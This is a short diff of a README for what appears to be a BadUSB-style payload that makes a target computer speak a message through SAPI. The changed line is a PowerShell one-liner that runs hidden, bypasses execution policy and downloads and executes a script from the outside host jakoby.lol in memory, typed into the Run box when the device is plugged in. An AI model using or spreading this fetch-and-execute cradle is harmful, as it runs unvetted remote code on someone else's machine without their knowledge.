@@ -40,7 +40,7 @@ SAPI speak with talk through their speakers the message provided or a custom one
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -Ep Bypass iwr jakoby.lol/yzb | iex
+powershell -w h -NoP -NonI -Ep Bypass irm jakoby.lol/yzb | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
